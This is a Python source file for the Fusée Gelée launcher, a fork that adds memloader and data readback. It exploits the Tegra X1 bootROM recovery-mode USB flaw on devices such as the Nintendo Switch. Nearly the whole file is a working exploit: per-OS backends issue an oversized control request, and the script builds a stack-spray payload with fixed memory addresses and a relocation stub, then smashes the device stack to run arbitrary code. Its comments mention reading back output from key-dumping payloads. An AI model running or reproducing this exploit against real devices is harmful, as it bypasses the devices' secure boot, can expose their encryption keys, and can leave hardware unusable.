#!/usr/bin/env python3
#
# fusée gelée
#
# Launcher for the {re}switched coldboot/bootrom hacks--
# launches payloads above the Horizon
#
# discovery and implementation by @ktemkin
# likely independently discovered by lots of others <3
#
# this code is political -- it stands with those who fight for LGBT rights
# don't like it? suck it up, or find your own damned exploit ^-^
#
# special thanks to:
#    ScirèsM, motezazer -- guidance and support
#    hedgeberg, andeor  -- dumping the Jetson bootROM
#    TuxSH              -- for IDB notes that were nice to peek at
#
# much love to:
#    Aurora Wright, Qyriad, f916253, MassExplosion213, and Levi
#
# greetings to:
#    shuffle2

# This fork adds support for sending memloader payloads similar to
# TegraRCMSmash. Data readback for payloads like biskeydump is also
# supported

# This file is part of Fusée Launcher
# Copyright (C) 2018 Mikaela Szekely <qyriad@gmail.com>
# Copyright (C) 2018 Kate Temkin <k@ktemkin.com>
# Copyright (C) 2019 Tobias Zimmermann <cu3po42@gmail.com>
# Fusée Launcher is licensed under the terms of the GNU GPLv2

import os
import sys
import errno
import ctypes
import struct
import argparse
import platform

# The address where the RCM payload is placed.
# This is fixed for most device.
RCM_PAYLOAD_ADDR    = 0x40010000

# The address where the user payload is expected to begin.
PAYLOAD_START_ADDR  = 0x40010E40

# Specify the range of addresses where we should inject oct
# payload address.
STACK_SPRAY_START   = 0x40014E40
STACK_SPRAY_END     = 0x40017000

# notes:
# GET_CONFIGURATION to the DEVICE triggers memcpy from 0x40003982
# GET_INTERFACE  to the INTERFACE triggers memcpy from 0x40003984
# GET_STATUS     to the ENDPOINT  triggers memcpy from <on the stack>

class HaxBackend:
    """
    Base class for backends for the TegraRCM vuln.
    """

    # USB constants used
    STANDARD_REQUEST_DEVICE_TO_HOST_TO_ENDPOINT = 0x82
    STANDARD_REQUEST_DEVICE_TO_HOST   = 0x80
    GET_DESCRIPTOR    = 0x6
    GET_CONFIGURATION = 0x8

    # Interface requests
    GET_STATUS        = 0x0

    # List of OSs this class supports.
    SUPPORTED_SYSTEMS = []

    def __init__(self, skip_checks=False):
        """ Sets up the backend for the given device. """
        self.skip_checks = skip_checks


    def print_warnings(self):
        """ Print any warnings necessary for the given backend. """
        pass


    def trigger_vulnerability(self, length):
        """
        Triggers the actual controlled memcpy.
        The actual trigger needs to be executed carefully, as different host OSs
        require us to ask for our invalid control request differently.
        """
        raise NotImplementedError("Trying to use an abstract backend rather than an instance of the proper subclass!")


    @classmethod
    def supported(cls, system_override=None):
        """ Returns true iff the given backend is supported on this platform. """

        # If we have a SYSTEM_OVERRIDE, use it.
        if system_override:
            system = system_override
        else:
            system = platform.system()

        return system in cls.SUPPORTED_SYSTEMS


    @classmethod
    def create_appropriate_backend(cls, system_override=None, skip_checks=False):
        """ Creates a backend object appropriate for the current OS. """

        # Search for a supportive backend, and try to create one.
        for subclass in cls.__subclasses__():
            if subclass.supported(system_override):
                return subclass(skip_checks=skip_checks)

        # ... if we couldn't, bail out.
        raise IOError("No backend to trigger the vulnerability-- it's likely we don't support your OS!")


    def read(self, length):
        """ Reads data from the RCM protocol endpoint. """
        return bytes(self.dev.read(0x81, length, 5000))


    def write_single_buffer(self, data):
        """
        Writes a single RCM buffer, which should be 0x1000 long.
        The last packet may be shorter, and should trigger a ZLP (e.g. not divisible by 512).
        If it's not, send a ZLP.
        """
        return self.dev.write(0x01, data, 1000)


    def find_device(self, vid=None, pid=None):
        """ Set and return the device to be used """

        import usb

        self.dev = usb.core.find(idVendor=vid, idProduct=pid)
        return self.dev


class MacOSBackend(HaxBackend):
    """
    Simple vulnerability trigger for macOS: we simply ask libusb to issue
    the broken control request, and it'll do it for us. :)

    We also support platforms with a hacked libusb and FreeBSD.
    """

    BACKEND_NAME = "macOS"
    SUPPORTED_SYSTEMS = ['Darwin', 'libusbhax', 'macos', 'FreeBSD']

    def trigger_vulnerability(self, length):

        # Triggering the vulnerability is simplest on macOS; we simply issue the control request as-is.
        return self.dev.ctrl_transfer(self.STANDARD_REQUEST_DEVICE_TO_HOST_TO_ENDPOINT, self.GET_STATUS, 0, 0, length)



class LinuxBackend(HaxBackend):
    """
    More complex vulnerability trigger for Linux: we can't go through libusb,
    as it limits control requests to a single page size, the limitation expressed
    by the usbfs. More realistically, the usbfs seems fine with it, and we just
    need to work around libusb.
    """

    BACKEND_NAME = "Linux"
    SUPPORTED_SYSTEMS = ['Linux', 'linux']
    SUPPORTED_USB_CONTROLLERS = ['pci/drivers/xhci_hcd', 'platform/drivers/dwc_otg']

    SETUP_PACKET_SIZE = 8

    IOCTL_IOR   = 0x80000000
    IOCTL_TYPE  = ord('U')
    IOCTL_NR_SUBMIT_URB = 10

    URB_CONTROL_REQUEST = 2

    class SubmitURBIoctl(ctypes.Structure):
        _fields_ = [
            ('type',          ctypes.c_ubyte),
            ('endpoint',      ctypes.c_ubyte),
            ('status',        ctypes.c_int),
            ('flags',         ctypes.c_uint),
            ('buffer',        ctypes.c_void_p),
            ('buffer_length', ctypes.c_int),
            ('actual_length', ctypes.c_int),
            ('start_frame',   ctypes.c_int),
            ('stream_id',     ctypes.c_uint),
            ('error_count',   ctypes.c_int),
            ('signr',         ctypes.c_uint),
            ('usercontext',   ctypes.c_void_p),
        ]


    def print_warnings(self):
        """ Print any warnings necessary for the given backend. """
        print("\nImportant note: on desktop Linux systems, we currently require an XHCI host controller.")
        print("A good way to ensure you're likely using an XHCI backend is to plug your")
        print("device into a blue 'USB 3' port.\n")


    def trigger_vulnerability(self, length):
        """
        Submit the control request directly using the USBFS submit_urb
        ioctl, which issues the control request directly. This allows us
        to send our giant control request despite size limitations.
        """

        import os
        import fcntl

        # We only work for devices that are bound to a compatible HCD.
        self._validate_environment()

        # Figure out the USB device file we're going to use to issue the
        # control request.
        fd = os.open('/dev/bus/usb/{:0>3d}/{:0>3d}'.format(self.dev.bus, self.dev.address), os.O_RDWR)

        # Define the setup packet to be submitted.
        setup_packet = \
            int.to_bytes(self.STANDARD_REQUEST_DEVICE_TO_HOST_TO_ENDPOINT, 1, byteorder='little') + \
            int.to_bytes(self.GET_STATUS,                                  1, byteorder='little') + \
            int.to_bytes(0,                                                2, byteorder='little') + \
            int.to_bytes(0,                                                2, byteorder='little') + \
            int.to_bytes(length,                                           2, byteorder='little')

        # Create a buffer to hold the result.
        buffer_size = self.SETUP_PACKET_SIZE + length
        buffer = ctypes.create_string_buffer(setup_packet, buffer_size)

        # Define the data structure used to issue the control request URB.
        request = self.SubmitURBIoctl()
        request.type          = self.URB_CONTROL_REQUEST
        request.endpoint      = 0
        request.buffer        = ctypes.addressof(buffer)
        request.buffer_length = buffer_size

        # Manually submit an URB to the kernel, so it issues our 'evil' control request.
        ioctl_number = (self.IOCTL_IOR | ctypes.sizeof(request) << 16 | ord('U') << 8 | self.IOCTL_NR_SUBMIT_URB)
        fcntl.ioctl(fd, ioctl_number, request, True)

        # Close our newly created fd.
        os.close(fd)

        # The other modules raise an IOError when the control request fails to complete. We don't fail out (as we don't bother
        # reading back), so we'll simulate the same behavior as the others.
        raise IOError("Raising an error to match the others!")


    def _validate_environment(self):
        """
        We can only inject giant control requests on devices that are backed
        by certain usb controllers-- typically, the xhci_hcd on most PCs.
        """

        from glob import glob

        # If we're overriding checks, never fail out.
        if self.skip_checks:
            print("skipping checks")
            return

        # Search each device bound to the xhci_hcd driver for the active device...
        for hci_name in self.SUPPORTED_USB_CONTROLLERS:
            for path in glob("/sys/bus/{}/*/usb*".format(hci_name)):
                if self._node_matches_our_device(path):
                    return

        raise ValueError("This device needs to be on a supported backend. Usually that means plugged into a blue/USB 3.0 port!\nBailing out.")


    def _node_matches_our_device(self, path):
        """
        Checks to see if the given sysfs node matches our given device.
        Can be used to check if an xhci_hcd controller subnode reflects a given device.,
        """

        # If this isn't a valid USB device node, it's not what we're looking for.
        if not os.path.isfile(path + "/busnum"):
            return False

        # We assume that a whole _bus_ is associated with a host controller driver, so we
        # only check for a matching bus ID.
        if self.dev.bus != self._read_num_file(path + "/busnum"):
            return False

        # If all of our checks passed, this is our device.
        return True


    def _read_num_file(self, path):
        """
        Reads a numeric value from a sysfs file that contains only a number.
        """

        with open(path, 'r') as f:
            raw = f.read()
            return int(raw)

class WindowsBackend(HaxBackend):
    """
    Use libusbK for most of it, and use the handle libusbK gets for us to call kernel32's DeviceIoControl
    """

    BACKEND_NAME = "Windows"
    SUPPORTED_SYSTEMS = ["Windows"]

    # Windows and libusbK specific constants
    WINDOWS_FILE_DEVICE_UNKNOWN = 0x00000022
    LIBUSBK_FUNCTION_CODE_GET_STATUS = 0x807
    WINDOWS_METHOD_BUFFERED = 0
    WINDOWS_FILE_ANY_ACCESS = 0

    RAW_REQUEST_STRUCT_SIZE = 24 # 24 is how big the struct is, just trust me
    TO_ENDPOINT = 2

    # Yoinked (with love) from Windows' CTL_CODE macro
    def win_ctrl_code(self, DeviceType, Function, Method, Access):
        """ Return a control code for use with DeviceIoControl() """
        return ((DeviceType) << 16 | ((Access) << 14) | ((Function)) << 2 | (Method))

    def __init__(self, skip_checks):
        import libusbK
        self.libk = libusbK
        # Grab libusbK
        self.lib = ctypes.cdll.libusbK


    def find_device(self, Vid, Pid):
        """
        Windows version of this function
        Its return isn't actually significant, but it needs to be not None
        """

        # Get a list of devices to use later
        device_list = self.libk.KLST_HANDLE()
        device_info = ctypes.pointer(self.libk.KLST_DEV_INFO())
        ret = self.lib.LstK_Init(ctypes.byref(device_list), 0)

        if ret == 0:
            raise ctypes.WinError()

        # Get info for a device with that vendor ID and product ID
        device_info = ctypes.pointer(self.libk.KLST_DEV_INFO())
        ret = self.lib.LstK_FindByVidPid(device_list, Vid, Pid, ctypes.byref(device_info))
        self.lib.LstK_Free(ctypes.byref(device_list))
        if device_info is None or ret == 0:
            return None

        # Populate function pointers for use with the driver our device uses (which should be libusbK)
        self.dev = self.libk.KUSB_DRIVER_API()
        ret = self.lib.LibK_LoadDriverAPI(ctypes.byref(self.dev), device_info.contents.DriverID)
        if ret == 0:
            raise ctypes.WinError()

        # Initialize the driver for use with our device
        self.handle = self.libk.KUSB_HANDLE(None)
        ret = self.dev.Init(ctypes.byref(self.handle), device_info)
        if ret == 0:
            raise self.libk.WinError()

        return self.dev


    def read(self, length):
        """ Read using libusbK """
        # Create the buffer to store what we read
        buffer = ctypes.create_string_buffer(length)

        len_transferred = ctypes.c_uint(0)

        # Call libusbK's ReadPipe using our specially-crafted function pointer and the opaque device handle
        ret = self.dev.ReadPipe(self.handle, ctypes.c_ubyte(0x81), ctypes.addressof(buffer), ctypes.c_uint(length), ctypes.byref(len_transferred), None)

        if ret == 0:
            raise ctypes.WinError()

        return buffer.raw[:len_transferred.value]

    def write_single_buffer(self, data):
        """ Write using libusbK """
        # Copy construct to a bytearray so we Know™ what type it is
        buffer = bytearray(data)

        # Convert wrap the data for use with ctypes
        cbuffer = (ctypes.c_ubyte * len(buffer))(*buffer)

        len_transferred = ctypes.c_uint(0)

        # Call libusbK's WritePipe using our specially-crafted function pointer and the opaque device handle
        ret = self.dev.WritePipe(self.handle, ctypes.c_ubyte(0x01), cbuffer, len(data), ctypes.byref(len_transferred), None)
        if ret == 0:
            raise ctypes.WinError()

    def ioctl(self, driver_handle: ctypes.c_void_p, ioctl_code: ctypes.c_ulong, input_bytes: ctypes.c_void_p, input_bytes_count: ctypes.c_size_t, output_bytes: ctypes.c_void_p, output_bytes_count: ctypes.c_size_t):
        """ Wrapper for DeviceIoControl """
        overlapped = self.libk.OVERLAPPED()
        ctypes.memset(ctypes.addressof(overlapped), 0, ctypes.sizeof(overlapped))

        ret = ctypes.windll.kernel32.DeviceIoControl(driver_handle, ioctl_code, input_bytes, input_bytes_count, output_bytes, output_bytes_count, None, ctypes.byref(overlapped))

        # We expect this to error, which matches the others ^_^
        if ret == False:
            raise ctypes.WinError()

    def trigger_vulnerability(self, length):
        """
        Go over libusbK's head and get the master handle it's been using internally
        and perform a direct DeviceIoControl call to the kernel to skip the length check
        """
        # self.handle is KUSB_HANDLE, cast to KUSB_HANDLE_INTERNAL to transparent-ize it
        internal = ctypes.cast(self.handle, ctypes.POINTER(self.libk.KUSB_HANDLE_INTERNAL))

        # Get the handle libusbK has been secretly using in its ioctl calls this whole time
        master_handle = internal.contents.Device.contents.MasterDeviceHandle

        if master_handle is None or master_handle == self.libk.INVALID_HANDLE_VALUE:
            raise ValueError("Failed to initialize master handle")

        # the raw request struct is pretty annoying, so I'm just going to allocate enough memory and set the few fields I need
        raw_request = ctypes.create_string_buffer(self.RAW_REQUEST_STRUCT_SIZE)

        # set timeout to 1000 ms, timeout offset is 0 (since it's the first member), and it's an unsigned int
        timeout_p = ctypes.cast(raw_request, ctypes.POINTER(ctypes.c_uint))
        timeout_p.contents = ctypes.c_ulong(1000) # milliseconds

        status_p = ctypes.cast(ctypes.byref(raw_request, 4), ctypes.POINTER(self.libk.status_t))
        status_p.contents.index = self.GET_STATUS
        status_p.contents.recipient = self.TO_ENDPOINT

        buffer = ctypes.create_string_buffer(length)

        code = self.win_ctrl_code(self.WINDOWS_FILE_DEVICE_UNKNOWN, self.LIBUSBK_FUNCTION_CODE_GET_STATUS, self.WINDOWS_METHOD_BUFFERED, self.WINDOWS_FILE_ANY_ACCESS)
        ret = self.ioctl(master_handle, ctypes.c_ulong(code), raw_request, ctypes.c_size_t(24), buffer, ctypes.c_size_t(length))

        if ret == False:
            raise ctypes.WinError()


class RCMHax:

    # Default to the Nintendo Switch RCM VID and PID.
    DEFAULT_VID = 0x0955
    DEFAULT_PID = 0x7321

    # Exploit specifics
    COPY_BUFFER_ADDRESSES   = [0x40005000, 0x40009000]   # The addresses of the DMA buffers we can trigger a copy _from_.
    STACK_END               = 0x40010000                 # The address just after the end of the device's stack.

    def __init__(self, wait_for_device=False, os_override=None, vid=None, pid=None, override_checks=False):
        """ Set up our RCM hack connection."""

        # The first write into the bootROM touches the lowbuffer.
        self.current_buffer = 0

        # Keep track of the total amount written.
        self.total_written = 0

        # Create a vulnerability backend for the given device.
        try:
            self.backend = HaxBackend.create_appropriate_backend(system_override=os_override, skip_checks=override_checks)
        except IOError:
            print("It doesn't look like we support your OS, currently. Sorry about that!\n")
            sys.exit(-1)

        # Grab a connection to the USB device itself.
        self.dev = self._find_device(vid, pid)

        # If we don't have a device...
        if self.dev is None:

            # ... and we're allowed to wait for one, wait indefinitely for one to appear...
            if wait_for_device:
                print("Waiting for a TegraRCM device to come online...")
                while self.dev is None:
                    self.dev = self._find_device(vid, pid)

            # ... or bail out.
            else:
                raise IOError("No TegraRCM device found?")

        # Print any use-related warnings.
        self.backend.print_warnings()

        # Notify the user of which backend we're using.
        print("Identified a {} system; setting up the appropriate backend.".format(self.backend.BACKEND_NAME))


    def _find_device(self, vid=None, pid=None):
        """ Attempts to get a connection to the RCM device with the given VID and PID. """

        # Apply our default VID and PID if neither are provided...
        vid = vid if vid else self.DEFAULT_VID
        pid = pid if pid else self.DEFAULT_PID

        # ... and use them to find a USB device.
        return self.backend.find_device(vid, pid)

    def read(self, length):
        """ Reads data from the RCM protocol endpoint. """
        return self.backend.read(length)


    def write(self, data):
        """ Writes data to the main RCM protocol endpoint. """

        length = len(data)
        packet_size = 0x1000

        while length:
            data_to_transmit = min(length, packet_size)
            length -= data_to_transmit

            chunk = data[:data_to_transmit]
            data  = data[data_to_transmit:]
            self.write_single_buffer(chunk)


    def write_single_buffer(self, data):
        """
        Writes a single RCM buffer, which should be 0x1000 long.
        The last packet may be shorter, and should trigger a ZLP (e.g. not divisible by 512).
        If it's not, send a ZLP.
        """
        self._toggle_buffer()
        return self.backend.write_single_buffer(data)


    def _toggle_buffer(self):
        """
        Toggles the active target buffer, paralleling the operation happening in
        RCM on the X1 device.
        """
        self.current_buffer = 1 - self.current_buffer


    def get_current_buffer_address(self):
        """ Returns the base address for the current copy. """
        return self.COPY_BUFFER_ADDRESSES[self.current_buffer]


    def read_device_id(self):
        """ Reads the Device ID via RCM. Only valid at the start of the communication. """
        return self.read(16)


    def switch_to_highbuf(self):
        """ Switches to the higher RCM buffer, reducing the amount that needs to be copied. """

        if self.get_current_buffer_address() != self.COPY_BUFFER_ADDRESSES[1]:
            self.write(b'\0' * 0x1000)


    def trigger_controlled_memcpy(self, length=None):
        """ Triggers the RCM vulnerability, causing it to make a signficantly-oversized memcpy. """

        # Determine how much we'd need to transmit to smash the full stack.
        if length is None:
            length = self.STACK_END - self.get_current_buffer_address()

        return self.backend.trigger_vulnerability(length)

def ensure_write(switch, data):
    bytes_sent = switch.write(data)
    if bytes_sent != len(data):
        print("Expected to send {} bytes, sent {}".format(len(data), bytes_sent))
        sys.exit(-1)

class MemloaderData(object):
    class LoadSection(object):
        def __init__(self, section_name, dataini_path, args):
            self.section_name = section_name
            self.file_name = args['if']
            if self.file_name.startswith("/"):
                self.file_name = self.file_name[1:]
            self.offset = int(args.get('skip', '0'), 0)
            self.length = int(args.get('count', '0'), 0)
            full_path = os.path.join(os.path.dirname(dataini_path), self.file_name)
            try:
                with open(full_path, 'rb') as f:
                    self.file_contents = f.read()[self.offset:self.offset+self.length]
            except:
                print("Cannot read file referenced in dataini load section. Is it in the same folder as the .ini?")
                sys.exit(-1)
            self.dst = int(args['dst'], 0)

        def send(self, switch):
            print("Sending {} ({} bytes) to address 0x{:X}".format(self.file_name, len(self.file_contents), self.dst))
            if len(self.file_contents) == 0:
                return
            RECV_MARKER = "RECV".encode('utf-8')
            ensure_write(switch, RECV_MARKER)
            ensure_write(switch, struct.pack('>II', self.dst, len(self.file_contents)))
            ensure_write(switch, self.file_contents)

    class CopySection(object):
        def __init__(self, section_name: str, dataini_path: str, args):
            self.section_name = section_name
            # TODO: figure out if comp_type is optional
            self.comp_type = int(args['type'], 0)
            self.src_addr = int(args['src'], 0)
            self.src_len = int(args['srclen'], 0)
            self.dst_addr = int(args['dst'], 0)
            self.dst_len = int(args['dstlen'], 0)

        def send(self, switch):
            print("Sending COPY command {} (from 0x{:X}-0x{:X} to 0x{:X}-0x{:X}) type {}".format(
                self.section_name,
                self.src_addr,
                self.src_addr + self.src_len,
                self.dst_addr,
                self.dst_addr + self.dst_len,
                self.comp_type
            ))
            COPY_MARKER = "COPY".encode('utf-8')
            ensure_write(switch, COPY_MARKER)
            ensure_write(switch, struct.pack(">IIIII",
                self.comp_type,
                self.src_addr,
                self.src_len,
                self.dst_addr,
                self.dst_len
            ))


    class BootSection(object):
        def __init__(self, section_name: str, dataini_path: str, args):
            self.section_name = section_name
            self.program_counter = int(args['pc'], 0)

        def send(self, switch):
            print("Booting AArch64 with PC 0x{:08X}...".format(self.program_counter))
            BOOT_MARKER = "BOOT".encode('utf-8')
            ensure_write(switch, BOOT_MARKER)
            ensure_write(switch, struct.pack(">I", self.program_counter))
            print("BOOT command sent successfully!")

    def __init__(self, dataIniPath: str):
        try:
            with open(dataIniPath, 'r') as f:
                (load, copy, boot) = self.parselines(dataIniPath, f.readlines())
                load.sort(key=lambda l: (0 == len(l.section_name), l.dst, l.section_name))
                self.sections = []
                self.sections.extend(load)
                self.sections.extend(copy)
                self.sections.extend(boot)
        except Exception as e:
            print("Could not load the provided dataIni. Is the path correct?")
            sys.exit(-1)

    def parselines(self, dataini_path: str, lines: [str]):
        import re

        SECTION_BEGIN = re.compile(r"^ *\[ *(\w+) *: *(\w*) *\] *(?:;.*)?$")
        KEY_VALUE = re.compile(r"^ *(\w+) *= *(\S+) *(?:;.*)?$")
        WHITESPACE = re.compile(r"^\s*(?:;.*)?$")
        section_types = {
            'load': self.LoadSection,
            'copy': self.CopySection,
            'boot': self.BootSection
        }

        sections = {
            'load': [],
            'copy': [],
            'boot': []
        }
        lines = filter(lambda l: not WHITESPACE.match(l), lines)
        try:
            next_line = next(lines)
            while True:
                m = SECTION_BEGIN.match(next_line)
                if not m:
                    print("dataini file is not valid.")
                    sys.exit(-1)
                section_type = m[1]
                section_name = m[2]
                args = {}
                try:
                    while True:
                        next_line = next(lines)
                        m = KEY_VALUE.match(next_line)
                        if not m:
                            break
                        args[m[1]] = m[2]
                except StopIteration as ex:
                    raise ex
                finally:
                    sections[section_type].append(section_types[section_type](section_name, dataini_path, args))
        except StopIteration:
            pass

        return (sections['load'], sections['copy'], sections['boot'])

    def has_sections(self):
        return len(self.sections) > 0

    def send(self, switch):
        for s in self.sections:
            s.send(switch)

def parse_usb_id(id):
    """ Quick function to parse VID/PID arguments. """
    return int(id, 16)

# Read our arguments.
parser = argparse.ArgumentParser(description='launcher for the fusee gelee exploit (by @ktemkin)')
parser.add_argument('payload', metavar='payload', type=str, help='ARM payload to be launched; should be linked at 0x40010000')
parser.add_argument('-w', dest='wait', action='store_true', help='wait for an RCM connection if one isn\'t present')
parser.add_argument('-V', metavar='vendor_id', dest='vid', type=parse_usb_id, default=None, help='overrides the TegraRCM vendor ID')
parser.add_argument('-P', metavar='product_id', dest='pid', type=parse_usb_id, default=None, help='overrides the TegraRCM product ID')
parser.add_argument('--override-os', metavar='platform', dest='platform', type=str, default=None, help='overrides the detected OS; for advanced users only')
parser.add_argument('--relocator', metavar='binary', dest='relocator', type=str, default="%s/intermezzo.bin" % os.path.dirname(os.path.abspath(__file__)), help='provides the path to the intermezzo relocation stub')
parser.add_argument('--override-checks', dest='skip_checks', action='store_true', help="don't check for a supported controller; useful if you've patched your EHCI driver")
parser.add_argument('--allow-failed-id', dest='permissive_id', action='store_true', help="continue even if reading the device's ID fails; useful for development but not for end users")
parser.add_argument('--dataini', dest='dataini', type=str, default=None, help='send a memloader payload over USB')
parser.add_argument('-r', '--readback', dest='readback', action='store_true', default=False, help='read and print any data sent by the payload')
arguments = parser.parse_args()

# Expand out the payload path to handle any user-refrences.
payload_path = os.path.expanduser(arguments.payload)
if not os.path.isfile(payload_path):
    print("Invalid payload path specified!")
    sys.exit(-1)

# Find our intermezzo relocator...
intermezzo_path = os.path.expanduser(arguments.relocator)
if not os.path.isfile(intermezzo_path):
    print("Could not find the intermezzo interposer. Did you build it?")
    sys.exit(-1)

# Load dataini argument if it was specified
dataini = None
if arguments.dataini is not None:
    dataini_path = os.path.expanduser(arguments.dataini)
    if not os.path.isfile(dataini_path):
        print("Could not find the specified data.ini.")
        sys.exit(-1)
    # Parse it now since that triggers loading of specified files
    dataini = MemloaderData(dataini_path)

# Get a connection to our device.
try:
    switch = RCMHax(wait_for_device=arguments.wait, vid=arguments.vid,
            pid=arguments.pid, os_override=arguments.platform, override_checks=arguments.skip_checks)
except IOError as e:
    print(e)
    sys.exit(-1)

# Print the device's ID. Note that reading the device's ID is necessary to get it into
try:
    device_id = switch.read_device_id()
    print("Found a Tegra with Device ID: {}".format(device_id))
except OSError as e:
    # Raise the exception only if we're not being permissive about ID reads.
    if not arguments.permissive_id:
        raise e


# Prefix the image with an RCM command, so it winds up loaded into memory
# at the right location (0x40010000).

# Use the maximum length accepted by RCM, so we can transmit as much payload as
# we want; we'll take over before we get to the end.
length  = 0x30298
payload = length.to_bytes(4, byteorder='little')

# pad out to 680 so the payload starts at the right address in IRAM
payload += b'\0' * (680 - len(payload))

# Populate from [RCM_PAYLOAD_ADDR, INTERMEZZO_LOCATION) with the payload address.
# We'll use this data to smash the stack when we execute the vulnerable memcpy.
print("\nSetting ourselves up to smash the stack...")

# Include the Intermezzo binary in the command stream. This is our first-stage
# payload, and it's responsible for relocating the final payload to 0x40010000.
intermezzo_size = 0
with open(intermezzo_path, "rb") as f:
    intermezzo      = f.read()
    intermezzo_size = len(intermezzo)
    payload        += intermezzo


# Pad the payload till the start of the user payload.
padding_size   = PAYLOAD_START_ADDR - (RCM_PAYLOAD_ADDR + intermezzo_size)
payload += (b'\0' * padding_size)

target_payload = b''

# Read the user payload into memory.
with open(payload_path, "rb") as f:
    target_payload = f.read()

# Fit a collection of the payload before the stack spray...
padding_size   = STACK_SPRAY_START - PAYLOAD_START_ADDR
payload += target_payload[:padding_size]

# ... insert the stack spray...
repeat_count = int((STACK_SPRAY_END - STACK_SPRAY_START) / 4)
payload += (RCM_PAYLOAD_ADDR.to_bytes(4, byteorder='little') * repeat_count)

# ... and follow the stack spray with the remainder of the payload.
payload += target_payload[padding_size:]

# Pad the payload to fill a USB request exactly, so we don't send a short
# packet and break out of the RCM loop.
payload_length = len(payload)
padding_size   = 0x1000 - (payload_length % 0x1000)
payload += (b'\0' * padding_size)

# Check to see if our payload packet will fit inside the RCM high buffer.
# If it won't, error out.
if len(payload) > length:
    size_over = len(payload) - length
    print("ERROR: Payload is too large to be submitted via RCM. ({} bytes larger than max).".format(size_over))
    sys.exit(errno.EFBIG)

# Send the constructed payload, which contains the command, the stack smashing
# values, the Intermezzo relocation stub, and the final payload.
print("Uploading payload...")
switch.write(payload)

# The RCM backend alternates between two different DMA buffers. Ensure we're
# about to DMA into the higher one, so we have less to copy during our attack.
switch.switch_to_highbuf()

# Smash the device's stack, triggering the vulnerability.
print("Smashing the stack...")
try:
    switch.trigger_controlled_memcpy()
except ValueError as e:
    print(str(e))
    sys.exit(-1)
except IOError:
    print("The USB device stopped responding-- sure smells like we've smashed its stack. :)")
    print("Launch complete!")

if arguments.readback or dataini is not None and dataini.has_sections():
    READY_INDICATOR = "READY.\n".encode('utf-8')

    try:
        while True:
            data_read = switch.read(0x8000)
            if data_read == READY_INDICATOR:
                print('Entering command mode.')
                if dataini is None:
                    print("No data to send :(")
                else:
                    dataini.send(switch)
                    if not arguments.readback:
                        sys.exit(0)
            else:
                print(" ".join("{:02X}".format(ord(c)) for c in data_read))
                print(data_read.decode('utf-8'))
    except Exception as e:
        import traceback
        print("Encountered an exception:")
        print(repr(e))
        print(str(e))
        print(traceback.format_exc())
